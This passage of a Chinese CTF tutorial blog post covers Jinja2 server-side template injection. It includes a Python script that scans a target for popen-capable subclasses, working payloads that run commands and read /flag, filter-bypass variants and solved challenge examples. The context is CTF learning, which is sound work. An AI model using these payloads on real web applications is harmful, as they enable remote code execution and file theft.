+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;生成执行ls命令的完整payload&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 通用版ls payload（适配大多数Python SSTI场景）</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload1</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="se">{{{{</span><span class="s2">&#39;&#39;.__class__.__base__.__subclasses__()[</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()</span><span class="se">}}}}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;已生成payload&#34;</span><span class="p">:</span> <span class="n">payload1</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 输入目标URL</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;请输入测试URL: &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;❌ URL不能为空&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 第一步：获取子类总数</span>
+</span></span><span class="line"><span class="cl">    <span class="n">subclasses_count</span> <span class="o">=</span> <span class="n">get_subclasses_count</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">subclasses_count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 第二步：逐个测试每个子类的__init__方法，筛选不含wrapper的序号</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">🔍 第二步：开始测试__init__方法，筛选不含wrapper的序号...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">valid_indexes</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">subclasses_count</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">index</span> <span class="o">%</span> <span class="mi">10</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;📌 进度：</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">subclasses_count</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">has_wrapper</span> <span class="o">=</span> <span class="n">test_init_method</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">has_wrapper</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">valid_indexes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;✅ 序号</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">：不含wrapper，加入候选列表&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">valid_indexes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;❌ 未找到不含wrapper的序号，测试结束&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">📊 第二步完成！共找到 </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">valid_indexes</span><span class="p">)</span><span class="si">}</span><span class="s2"> 个不含wrapper的序号：</span><span class="si">{</span><span class="n">valid_indexes</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 第三步：可选 - 从候选序号中查找含Popen的序号</span>
+</span></span><span class="line"><span class="cl">    <span class="n">check_popen</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">是否需要从候选序号中查找含Popen的序号？(y/n)：&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">check_popen</span> <span class="o">!=</span> <span class="s2">&#34;y&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">📋 最终不含wrapper的序号列表：&#34;</span><span class="p">,</span> <span class="n">valid_indexes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">🔍 第三步：开始检测候选序号中的Popen函数（找到即停止）...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">popen_index</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="n">popen_content</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="n">valid_indexes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;📌 正在检测序号</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">has_popen</span><span class="p">,</span> <span class="n">content</span> <span class="o">=</span> <span class="n">test_popen_in_globals</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">has_popen</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">popen_index</span> <span class="o">=</span> <span class="n">index</span>
+</span></span><span class="line"><span class="cl">            <span class="n">popen_content</span> <span class="o">=</span> <span class="n">content</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;✅ 序号</span><span class="si">{</span><span class="n">index</span><span class="si">}</span><span class="s2">：检测到Popen函数！停止测试&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 输出Popen检测结果</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">popen_index</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">🎉 找到可执行命令的序号：</span><span class="si">{</span><span class="n">popen_index</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 生成ls payload</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payloads</span> <span class="o">=</span> <span class="n">generate_ls_payload</span><span class="p">(</span><span class="n">popen_index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">🚀 可执行ls命令的payload：&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">name</span><span class="p">,</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">payloads</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">：</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">❌ 所有候选序号中均未检测到Popen函数&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;📋 不含wrapper的序号列表：&#34;</span><span class="p">,</span> <span class="n">valid_indexes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>填入脚本生成的payload，修改<code>read()</code>前括号中的命令直到读取到flag为止</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">141</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;ls /&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">141</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="利用内嵌函数">利用内嵌函数
+</h3><p>首先需要的是已经重载的类</p>
+<p>使用<code>__builtins__</code>加载内嵌函数，再调用内嵌函数</p>
+<p>比如调用eval：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">103</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;ls /&#39;).read()&#34;</span><span class="p">)}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">103</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()&#34;</span><span class="p">)}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>加上<code>__builtins__</code>后，可以访问到所有 Python 的内置函数，而不必局限于当前命名空间或特定类的静态方法。</p>
+<h3 id="其他-payload">其他 payload
+</h3><p>利用 open 函数读取文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>调用 os 模块执行 <code>os.popen()</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">joiner</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls /&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">cycler</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">namespace</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用 lipsum 执行命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">][</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;ls /&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="常见绕过突破">常见绕过突破
+</h2><h3 id="过滤中括号">过滤中括号
+</h3><p>使用<code>.pop(xx)</code>代替<code>[xx]</code></p>
+<p>payload1：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">121</span><span class="p">)</span><span class="o">.</span><span class="n">get_data</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s2">&#34;/flag&#34;</span><span class="p">)}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload2：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">141</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="过滤了点">过滤了点
+</h3><p>换一个写法：</p>
+<p>attr 是一个过滤器，用于获取变量：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="p">}}</span>	<span class="o">--&gt;</span>		<span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__class__&#39;</span><span class="p">)}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">141</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对于上述两种绕过，可以使用给出的脚本<a class="link" href="https://raw.githubusercontent.com/makabaka11/blog-files/refs/heads/master/ssti.txt"  target="_blank" rel="noopener"
+    >ssti.py</a></p>
+<h3 id="过滤下划线">过滤下划线
+</h3><div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th><strong>对象</strong></th>
+          <th><strong>获取数据的方式</strong></th>
+          <th><strong>对应的 HTTP 方法</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>request.form</code></td>
+          <td>从 **请求体(Body) **中解析表单数据</td>
+          <td>主要是 <strong>POST</strong></td>
+      </tr>
+      <tr>
+          <td><code>request.args</code></td>
+          <td>从 **URL 查询字符串 **中获取参数</td>
+          <td>主要是 <strong>GET</strong></td>
+      </tr>
+  </tbody>
+</table></div>
+<hr>
+<h2 id="fenjing-使用">fenjing 使用
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pip</span> <span class="n">install</span> <span class="n">fenjing</span>
+</span></span><span class="line"><span class="cl"><span class="n">fenjing</span> <span class="n">webui</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="例题">例题
+</h2><h3 id="ssti1无过滤">ssti1（无过滤）
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">121</span><span class="p">][</span><span class="s2">&#34;get_data&#34;</span><span class="p">](</span><span class="mi">0</span><span class="p">,</span><span class="s2">&#34;/flag&#34;</span><span class="p">)}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="ssti2过滤点">ssti2（过滤点）
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">141</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="ssti3过滤中括号和点">ssti3（过滤中括号和点）
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__class__&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__base__&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__subclasses__&#39;</span><span class="p">)()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__getitem__&#39;</span><span class="p">)(</span><span class="mi">141</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__init__&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__globals__&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__getitem__&#39;</span><span class="p">)(</span><span class="s1">&#39;popen&#39;</span><span class="p">)(</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">)()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="ssti4过滤中括号和下划线">ssti4（过滤中括号和下划线）
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">target_url</span> <span class="o">=</span> <span class="s2">&#34;http://47.109.105.62:33144/&#34;</span>  <span class="c1"># 替换成题目实际地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload_param</span> <span class="o">=</span> <span class="s2">&#34;a&#34;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ========== 完全保留你提供的payload ==========</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;{{</span><span class="se">\&#39;\&#39;</span><span class="s1">|attr(request.args.p1)|attr(request.args.p2)|attr(request.args.p3)()|attr(</span><span class="se">\&#39;</span><span class="s1">pop</span><span class="se">\&#39;</span><span class="s1">)(121)|attr(request.args.p4)(0,&#34;/flag&#34;)}}&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ========== 完全保留你提供的参数（p4=get_data） ==========</span>
+</span></span><span class="line"><span class="cl"><span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload_param</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>  <span class="c1"># payload放在题目指定参数里</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;p1&#39;</span><span class="p">:</span> <span class="s1">&#39;__class__&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;p2&#39;</span><span class="p">:</span> <span class="s1">&#39;__base__&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;p3&#39;</span><span class="p">:</span> <span class="s1">&#39;__subclasses__&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;p4&#39;</span><span class="p">:</span> <span class="s1">&#39;get_data&#39;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ========== 发送请求（GET方式，适配request.args） ==========</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
